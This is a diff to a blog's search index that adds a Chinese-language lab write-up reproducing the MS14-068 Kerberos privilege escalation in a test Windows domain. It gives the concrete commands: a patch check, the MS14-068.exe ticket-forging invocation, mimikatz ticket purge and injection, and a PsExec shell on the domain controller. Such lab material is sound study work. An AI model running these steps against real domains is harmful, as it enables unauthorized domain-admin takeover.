@@ -1044,4 +1044,46 @@
         <tag>域渗透</tag>
       </tags>
   </entry>
+  <entry>
+    <title>域渗透-MS14-068权限提升漏洞利用实验</title>
+    <url>/2025/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>MS14-068是微软在2014年11月发布的一个紧急补丁，其对应的知识库编号是KB3011780。 该补丁修复了CVE-2014-6324漏洞，该漏洞允许攻击者通过利用Kerberos KDC漏洞，将普通域用户权限提升为域管理员权限。</p>
+<h2 id="确认域控服务器是否安装补丁"><a href="#确认域控服务器是否安装补丁" class="headerlink" title="确认域控服务器是否安装补丁"></a>确认域控服务器是否安装补丁</h2><p>执行<code>systeminfo | findstr 3011780</code>，返回结果为空，则说明没安装补丁。</p>
+<p><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003200158254.png" alt="image-20251003200158254"></p>
+<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol>
+<li>exploit程序（<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068%EF%BC%89">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068）</a></li>
+<li>psexec（<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec%EF%BC%89">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec）</a></li>
+<li>mimikatz（<a href="https://github.com/gentilkiwi/mimikatz%EF%BC%89">https://github.com/gentilkiwi/mimikatz）</a></li>
+</ol>
+<h2 id="漏洞利用复现"><a href="#漏洞利用复现" class="headerlink" title="漏洞利用复现"></a>漏洞利用复现</h2><ol>
+<li><p>当前环境信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2k8r2域控服务器IP：10.10.10.1</span><br><span class="line">加入域的win7主机IP：10.10.10.2</span><br><span class="line">普通域用户账号/密码：alice/win7user1.</span><br></pre></td></tr></table></figure></li>
+<li><p>复制所有工具到win7。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201639494.png" alt="image-20251003201639494"></p>
+</li>
+<li><p>win7用普通域用户alice登录，测试访问域控的C盘共享，访问被拒绝。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201923944.png" alt="image-20251003201923944"></p>
+</li>
+<li><p>使用mimikatz，执行<code>kereros::list</code>列出票据，执行<code>kerberos::purge</code>，将内存中已有的kerberos票据清除，再执行<code>kereros::list</code>确认是否清除票据。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202235047.png" alt="image-20251003202235047"><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202308878.png" alt="image-20251003202308878"></p>
+</li>
+<li><p>执行<code>whoami /all</code>查看本机用户SID。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202543769.png" alt="image-20251003202543769"></p>
+</li>
+<li><p>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书。<code>MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</code></p>
+</li>
+<li><p>实际执行<code>MS14-068.exe -u alice@test.com -s S-1-5-21-2801992062-1918021354-1617932239-1108 -d 10.10.10.1 -p win7user1.</code>，执行完毕生成TGT。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203004853.png" alt="image-20251003203004853"></p>
+</li>
+<li><p>利用mimikatz.exe将证书写入，从而提升为域管理员。执行<code>kerberos::ptc 刚才生成的tgt路径</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203245919.png" alt="image-20251003203245919"></p>
+</li>
+<li><p>再次列出域控制器的C盘目录，成功访问域控的C盘，说明普通域用户提权成域管理员用户成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203404168.png" alt="image-20251003203404168"></p>
+</li>
+<li><p>使用PSTools目录下的PsExec.exe获取shell，以域管理员权限运行连接域控。执行<code>PsExec.exe \\win2k8dc.test.com cmd.exe</code>。进入shell后，执行<code>ipconfig</code>确认是否是域控服务器IP<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203654003.png" alt="image-20251003203654003"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
 </search>
